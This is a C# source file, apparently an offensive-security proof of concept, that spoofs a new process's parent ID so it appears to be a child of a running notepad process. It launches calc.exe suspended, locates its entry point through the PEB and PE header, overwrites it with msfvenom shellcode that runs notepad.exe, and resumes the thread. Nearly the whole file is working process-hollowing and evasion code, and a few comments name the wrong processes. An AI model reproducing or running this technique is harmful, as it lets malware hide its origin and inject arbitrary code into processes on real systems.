using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ppidSpoof
{
    class Program
    {
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo; 
            public IntPtr lpAttributeList;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            // Contains information about a newly created process and its primary thread
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();

            // Specifies the window station, desktop, standard handles, and attributes for a new process
            STARTUPINFOEX startUpInfoEx = new STARTUPINFOEX();

            IntPtr lpValueProc = IntPtr.Zero;
            IntPtr lpAttributeListSize = IntPtr.Zero;

            // Initializes the specified list of attributes for process and thread creation.
            // This call is used just to get the buffer size for memory allocation
            // lpAttributeList parameter is NULL, so lAttributeListpSize stores the required buffer size in bytes
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpAttributeListSize);

            // Allocate unmanaged memory for the AttributeList
            startUpInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpAttributeListSize);

            // this call actually initializes the attributelist
            // lpAttributeListSize is adjusted to the size of the initialized attributes
            InitializeProcThreadAttributeList(startUpInfoEx.lpAttributeList, 1, 0, ref lpAttributeListSize);

            // Get the PID of the explorer process
            Process[] proc = Process.GetProcessesByName("notepad");

            // PROCESS_CREATE_PROCESS = 0x0080 -> Required to create a process.
            // PROCESS_DUP_HANDLE = 0x0040 -> Required to duplicate a handle using DuplicateHandle.
            IntPtr hParentHandle = OpenProcess(0x00C0, false, proc[0].Id);

            // Allocates unmanaged, non-zeroed memory
            lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);

            // writes the handle to the parent process to unmanaged memory
            Marshal.WriteIntPtr(lpValueProc, hParentHandle);

            // Adds specified attribute to the AttributeList
            // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000 -> Indicates that the lpValueProc contains a pointer to a handle to the parent process
            UpdateProcThreadAttribute(startUpInfoEx.lpAttributeList, 0, (IntPtr)0x00020000, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            // dwCreationFlags
            //    EXTENDED_STARTUPINFO_PRESENT = 0x00080000 -> The process is created with extended startup information
            //    CREATE_NEW_CONSOLE = 0x00000010 -> The new process has a new console, instead of inheriting its parent's console (the default)
            //    CREATE_SUSPENDED = 0x00000004 -> The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called.
            CreateProcess("C:\\Windows\\System32\\calc.exe", null, IntPtr.Zero, IntPtr.Zero, true, 0x00080014, IntPtr.Zero, null, ref startUpInfoEx, out processInfo);

            //Create PROCESS_BASIC_INFORMATION structure for ZwQueryInformationProcess
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            //Get a handle to the create svchost process
            IntPtr hProcess = processInfo.hProcess;

            //Execute ZwQueryInformationProcess
            //(uint)(IntPtr.Size * 6): mul by 6 because the struct has 6 fields
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            //Base Address = PEB + 0x10
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            //Read the base address of the process from the PEB
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            //PE Header is 0x200 bytes
            byte[] data = new byte[0x200];
            //Read PE Header
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            //e_lfanew = base address + 0x3c
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            //EntryPoint RVA = offset value from e_lfanew + 0x28
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            //EntryPoint = EntryPoint RVA + base address
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // msfvenom -p windows/x64/exec cmd=notepad.exe -f csharp
            byte[] buf = new byte[279] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
            0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
            0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
            0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
            0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
            0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
            0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
            0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };

            //Write shellcode to EntryPoint
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            //Resume process to execute shellcode
            ResumeThread(processInfo.hThread);
        }
    }
}
